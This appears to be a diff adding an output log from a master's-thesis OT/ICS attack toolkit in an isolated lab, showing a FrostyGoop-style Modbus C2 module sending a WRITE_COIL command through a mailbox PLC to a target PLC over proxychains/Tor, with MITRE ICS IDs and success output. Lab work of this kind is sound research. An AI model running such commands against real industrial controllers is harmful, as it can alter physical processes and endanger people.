@@ -1,0 +1,25 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  C2 Modbus (FrostyGoop) — Ataque OT: WRITE_COIL vía C2
+======================================================================
+  Fecha      : 2026-10-13 16:47:10
+  Objetivo   : mailbox=192.168.10.11:502, target=192.168.10.10, addr=0, val=1
+  MITRE ICS  : T0869, T0855, T0836
+======================================================================
+$ proxychains python3 -m modules._cli.c2_modbus_cli write_coil --mailbox 192.168.10.11 --mailbox-port 502 --target-ip 192.168.10.10 --data-address 0 --value 1
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+
+────────────────────────────────────────────────────────────
+[C2] OT Attack: WRITE_COIL -> 192.168.10.10 addr=0 val=1
+────────────────────────────────────────────────────────────
+[*] Conectando a PLC-buzón 192.168.10.11:502 (UID=2)...
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+[+] Comando enviado: opcode=write_coil, seq=24719, payload=13B (7 regs)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.11:502  ...  OK
+[*] Esperando respuesta (seq=24719, timeout=30s, poll=3s)...
+[+] Respuesta recibida: status=OK, payload=45B
+[+] Salida:
+    WRITE_COIL OK: 192.168.10.10:502 addr=0 val=1
+[=] Código de salida: 0
